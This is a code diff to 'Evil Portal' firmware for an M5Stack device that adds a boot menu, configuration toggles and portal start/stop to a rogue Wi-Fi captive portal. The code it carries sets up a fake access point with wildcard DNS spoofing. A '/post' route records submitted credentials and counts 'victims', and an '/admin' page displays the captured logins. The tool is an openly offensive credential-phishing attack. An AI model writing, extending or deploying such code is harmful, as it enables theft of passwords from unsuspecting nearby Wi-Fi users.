@@ -41,6 +41,21 @@ const unsigned long BLINK_INTERVAL = 150;  // ms between toggles
 #define C_COUNT   RGB565(255, 196, 0)    // victim count (amber)
 #define C_DANGER  RGB565(229, 72, 77)    // low-battery fill (red)
 bool dotOn = false;
+
+// -------- App menu / state machine --------
+// The device boots into a menu (Tools / Configuration / Exit) instead of
+// launching the portal straight away. The portal AP + web server only come
+// up when the operator chooses Tools > Start Evil Portal.
+enum AppState { ST_MENU_MAIN, ST_MENU_TOOLS, ST_MENU_CONFIG, ST_RUNNING };
+AppState appState = ST_MENU_MAIN;
+int menuSel = 0;              // highlighted row in the current menu
+bool portalStarted = false;  // AP + web server currently up?
+
+// Configuration options (toggled from the Configuration menu)
+bool soundOn = true;             // beep when a credential is captured
+bool ledBlinkOn = true;          // blink the LED when a credential is captured
+uint8_t brightLevel = 2;         // screen brightness index (0..2)
+const uint8_t BRIGHT_VALS[3] = {8, 11, 14};
  
 // Init System Settings
 const byte HTTP_CODE = 200;
@@ -299,28 +314,34 @@ int getBatteryPct() {
   return pct;
 }
 
-// Battery gauge: a cell-shaped icon (body + nub) whose fill tracks the
-// charge level, with the percentage printed to its left. Drawn in the SSID
-// row, top-right. Repainted on the idle tick so the reading stays current.
-void drawBattery() {
+// Battery gauge: a cell-shaped icon (body + nub) whose fill tracks the charge
+// level, with the percentage printed to its left. The outline/text use
+// `fg` and the surrounding area is cleared with `bg` so it can sit on the
+// dark body (dashboard) or on the blue header bar (menus).
+void drawBatteryAt(int bx, int by, uint16_t fg, uint16_t bg) {
   int pct = getBatteryPct();
-  const int bx = 208, by = 38, bw = 26, bh = 13;
+  const int bw = 26, bh = 13;
   uint16_t col = (pct > 50) ? C_OK : (pct > 20 ? C_COUNT : C_DANGER);
 
   // Clear the gauge area (percentage width changes with the digit count).
-  M5.Lcd.fillRect(156, by - 2, 84, bh + 5, C_BG);
+  M5.Lcd.fillRect(bx - 40, by - 2, 40 + bw + 6, bh + 5, bg);
 
   // Cell body, terminal nub, and proportional fill.
-  M5.Lcd.drawRoundRect(bx, by, bw, bh, 2, C_MUTED);
-  M5.Lcd.fillRect(bx + bw, by + 4, 3, bh - 8, C_MUTED);
+  M5.Lcd.drawRoundRect(bx, by, bw, bh, 2, fg);
+  M5.Lcd.fillRect(bx + bw, by + 4, 3, bh - 8, fg);
   int fw = (bw - 4) * pct / 100;
   M5.Lcd.fillRect(bx + 2, by + 2, fw, bh - 4, col);
 
   // Percentage to the left of the icon.
   M5.Lcd.setTextDatum(MR_DATUM);
   M5.Lcd.setTextSize(1);
-  M5.Lcd.setTextColor(C_MUTED, C_BG);
+  M5.Lcd.setTextColor(fg, bg);
   M5.Lcd.drawString(String(pct) + "%", bx - 5, by + bh / 2);
+}
+
+// Dashboard battery gauge (top-right of the SSID row, on the dark body).
+void drawBattery() {
+  drawBatteryAt(208, 38, C_MUTED, C_BG);
 }
 
 // Animated boot splash: wordmark + a progress bar that fills once.
@@ -393,27 +414,25 @@ void drawMainScreen() {
   M5.Lcd.drawString(String(capcount), 226, 111);
 }
 
-void setup() {
-  M5.begin();
-  M5.Lcd.setRotation(3);
+void applyBrightness() {
+  M5.Axp.ScreenBreath(BRIGHT_VALS[brightLevel]);
+}
 
-  bootScreen();  // animated splash while things come up
-
-  WiFi.mode(WIFI_AP);
-  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
-  WiFi.softAP(SSID_NAME);
-  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
- 
+// Register HTTP routes once. Handlers are safe to attach before the AP is up;
+// this runs a single time from setup() so repeated start/stop cycles don't
+// stack duplicate handlers.
+void registerRoutes() {
   webServer.on("/post", []() {
     capcount++;
     storedCount++;
     webServer.send(HTTP_CODE, "text/html", posted());
-    M5.Beep.tone(4000);
-    delay(50);
-    M5.Beep.mute();
-    startBlink();  // non-blocking; loop() redraws the stats screen with the new count
+    if (soundOn) {
+      M5.Beep.tone(4000);
+      delay(50);
+      M5.Beep.mute();
+    }
+    if (ledBlinkOn) startBlink();  // non-blocking; loop() redraws the dashboard
   });
- 
   webServer.on("/admin", []() {
     webServer.send(HTTP_CODE, "text/html", creds());
   });
@@ -423,28 +442,237 @@ void setup() {
   webServer.onNotFound([]() {
     webServer.send(HTTP_CODE, "text/html", index());
   });
-  webServer.begin();
-  pinMode(BUILTIN_LED, OUTPUT);
-  digitalWrite(BUILTIN_LED, HIGH);
+}
 
-  drawMainScreen();     // show the dashboard once the AP is up
+// Bring the captive-portal AP + DNS + web server up and switch to the
+// live dashboard.
+void startPortal() {
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(SSID_NAME);
+  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (HTTP only)
+  webServer.begin();
+  portalStarted = true;
+
+  appState = ST_RUNNING;
+  drawMainScreen();
   previous = capcount;  // avoid an immediate redraw on the first loop tick
   dotOn = true;
+  lastTick = millis();
 }
- 
-void loop() {
-  if ((millis() - lastTick) > TICK_TIMER) {
-    lastTick = millis();
-    if (capcount != previous) {
-      previous = capcount;
-      drawMainScreen();   // full repaint with the new count
-      dotOn = true;
-    } else {
-      dotOn = !dotOn;     // idle heartbeat: blink the "active" dot
-      drawStatusDot(dotOn);
-      drawBattery();      // keep the battery reading current
-    }
+
+// Tear the portal down and go back to idle (used when returning to the menu).
+void stopPortal() {
+  if (portalStarted) {
+    dnsServer.stop();
+    webServer.stop();
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_OFF);
+    portalStarted = false;
   }
-  updateBlink();
-  dnsServer.processNextRequest(); webServer.handleClient();
+  blinkRemaining = 0;
+  digitalWrite(BUILTIN_LED, HIGH);  // LED off (active LOW)
+}
+
+// -------- Menu rendering + navigation --------
+
+int currentMenuCount() {
+  if (appState == ST_MENU_MAIN)  return 3;  // Tools / Configuration / Exit
+  if (appState == ST_MENU_TOOLS) return 3;  // Start / Device Info / Back
+  return 4;                                 // Beep / LED / Brightness / Back
+}
+
+// Repaint the whole menu screen for the current state + selection.
+void drawMenu() {
+  M5.Lcd.fillScreen(C_BG);
+
+  // Header bar with left-aligned title + battery gauge on the right.
+  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
+  M5.Lcd.setTextDatum(ML_DATUM);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
+  const char* title = (appState == ST_MENU_MAIN) ? "MAIN MENU"
+                    : (appState == ST_MENU_TOOLS) ? "TOOLS" : "CONFIG";
+  M5.Lcd.drawString(title, 8, 13);
+  drawBatteryAt(206, 6, TFT_WHITE, C_ACCENT);
+
+  // Build the item labels for this menu.
+  String items[4];
+  int n = currentMenuCount();
+  if (appState == ST_MENU_MAIN) {
+    items[0] = "Tools";
+    items[1] = "Configuration";
+    items[2] = "Exit";
+  } else if (appState == ST_MENU_TOOLS) {
+    items[0] = "Start Evil Portal";
+    items[1] = "Device Info";
+    items[2] = "Back";
+  } else {
+    items[0] = String("Beep: ")       + (soundOn ? "ON" : "OFF");
+    items[1] = String("LED blink: ")  + (ledBlinkOn ? "ON" : "OFF");
+    items[2] = String("Brightness: ") + String(brightLevel + 1);
+    items[3] = "Back";
+  }
+
+  // Rows: highlighted item gets the accent background.
+  const int y0 = 32, rowH = 22, rowInner = 18;
+  for (int i = 0; i < n; i++) {
+    int y = y0 + i * rowH;
+    bool sel = (i == menuSel);
+    M5.Lcd.fillRoundRect(8, y, 224, rowInner, 4, sel ? C_ACCENT : C_CARD);
+    M5.Lcd.setTextDatum(ML_DATUM);
+    M5.Lcd.setTextSize(2);
+    M5.Lcd.setTextColor(sel ? TFT_WHITE : C_MUTED, sel ? C_ACCENT : C_CARD);
+    M5.Lcd.drawString(items[i], 16, y + rowInner / 2);
+  }
+
+  // Footer hint.
+  M5.Lcd.setTextDatum(BC_DATUM);
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextColor(C_MUTED, C_BG);
+  M5.Lcd.drawString("BtnB: move    BtnA: select", 120, 134);
+}
+
+// Blocking info screen; returns to the Tools menu on any button press.
+void showDeviceInfo() {
+  M5.Lcd.fillScreen(C_BG);
+  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
+  M5.Lcd.setTextDatum(ML_DATUM);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
+  M5.Lcd.drawString("DEVICE INFO", 8, 13);
+
+  M5.Lcd.setTextSize(1);
+  int y = 34;
+  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("SSID", 8, y);
+  M5.Lcd.setTextColor(TFT_WHITE, C_BG); M5.Lcd.drawString(SSID_NAME, 8, y + 10); y += 26;
+  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("ADMIN PANEL", 8, y);
+  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString("http://" + APIP.toString() + "/admin", 8, y + 10); y += 26;
+  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("PORTAL", 8, y);
+  M5.Lcd.setTextColor(portalStarted ? C_OK : C_DANGER, C_BG);
+  M5.Lcd.drawString(portalStarted ? "RUNNING" : "STOPPED", 8, y + 10);
+
+  M5.Lcd.setTextDatum(BC_DATUM);
+  M5.Lcd.setTextColor(C_MUTED, C_BG);
+  M5.Lcd.drawString("Press any button to go back", 120, 134);
+
+  while (true) {
+    M5.update();
+    if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed()) break;
+    delay(20);
+  }
+  appState = ST_MENU_TOOLS;
+  menuSel = 1;
+  drawMenu();
+}
+
+// Blocking confirm screen for Exit. BtnA powers the device off; BtnB cancels.
+void doExit() {
+  M5.Lcd.fillScreen(C_BG);
+  M5.Lcd.setTextDatum(MC_DATUM);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
+  M5.Lcd.drawString("Power off?", 120, 50);
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextColor(C_MUTED, C_BG);
+  M5.Lcd.drawString("BtnA = Yes       BtnB = No", 120, 90);
+
+  while (true) {
+    M5.update();
+    if (M5.BtnA.wasPressed()) {
+      M5.Lcd.fillScreen(C_BG);
+      M5.Lcd.setTextDatum(MC_DATUM);
+      M5.Lcd.setTextSize(3);
+      M5.Lcd.setTextColor(C_ACCENT2, C_BG);
+      M5.Lcd.drawString("Bye!", 120, 60);
+      delay(700);
+      M5.Axp.PowerOff();
+    }
+    if (M5.BtnB.wasPressed()) {
+      appState = ST_MENU_MAIN;
+      menuSel = 2;
+      drawMenu();
+      return;
+    }
+    delay(20);
+  }
+}
+
+// Act on the highlighted item in the current menu.
+void selectCurrent() {
+  if (appState == ST_MENU_MAIN) {
+    if (menuSel == 0)      { appState = ST_MENU_TOOLS;  menuSel = 0; drawMenu(); }
+    else if (menuSel == 1) { appState = ST_MENU_CONFIG; menuSel = 0; drawMenu(); }
+    else                   { doExit(); }
+  } else if (appState == ST_MENU_TOOLS) {
+    if (menuSel == 0)      { startPortal(); }           // -> ST_RUNNING
+    else if (menuSel == 1) { showDeviceInfo(); }
+    else                   { appState = ST_MENU_MAIN; menuSel = 0; drawMenu(); }
+  } else {  // ST_MENU_CONFIG
+    if (menuSel == 0)      { soundOn = !soundOn; drawMenu(); }
+    else if (menuSel == 1) { ledBlinkOn = !ledBlinkOn; drawMenu(); }
+    else if (menuSel == 2) { brightLevel = (brightLevel + 1) % 3; applyBrightness(); drawMenu(); }
+    else                   { appState = ST_MENU_MAIN; menuSel = 1; drawMenu(); }
+  }
+}
+
+// BtnB scrolls the selection, BtnA activates it.
+void handleMenuButtons() {
+  if (M5.BtnB.wasPressed()) {
+    menuSel = (menuSel + 1) % currentMenuCount();
+    drawMenu();
+  }
+  if (M5.BtnA.wasPressed()) {
+    selectCurrent();
+  }
+}
+
+void setup() {
+  M5.begin();
+  M5.Lcd.setRotation(3);
+  pinMode(BUILTIN_LED, OUTPUT);
+  digitalWrite(BUILTIN_LED, HIGH);
+  applyBrightness();
+
+  bootScreen();       // animated splash
+  registerRoutes();   // attach HTTP handlers once (AP starts later, from the menu)
+
+  appState = ST_MENU_MAIN;
+  menuSel = 0;
+  drawMenu();         // boot into the menu instead of auto-starting the portal
+}
+
+void loop() {
+  M5.update();  // refresh button states every tick
+
+  if (appState == ST_RUNNING) {
+    // Hold the side button (BtnB) to stop the portal and return to the menu.
+    if (M5.BtnB.pressedFor(800)) {
+      stopPortal();
+      appState = ST_MENU_MAIN;
+      menuSel = 0;
+      drawMenu();
+      return;
+    }
+
+    if ((millis() - lastTick) > TICK_TIMER) {
+      lastTick = millis();
+      if (capcount != previous) {
+        previous = capcount;
+        drawMainScreen();   // full repaint with the new count
+        dotOn = true;
+      } else {
+        dotOn = !dotOn;     // idle heartbeat: blink the "active" dot
+        drawStatusDot(dotOn);
+        drawBattery();      // keep the battery reading current
+      }
+    }
+    updateBlink();
+    dnsServer.processNextRequest();
+    webServer.handleClient();
+    return;
+  }
+
+  // Menu states (ST_MENU_MAIN / ST_MENU_TOOLS / ST_MENU_CONFIG)
+  handleMenuButtons();
 }
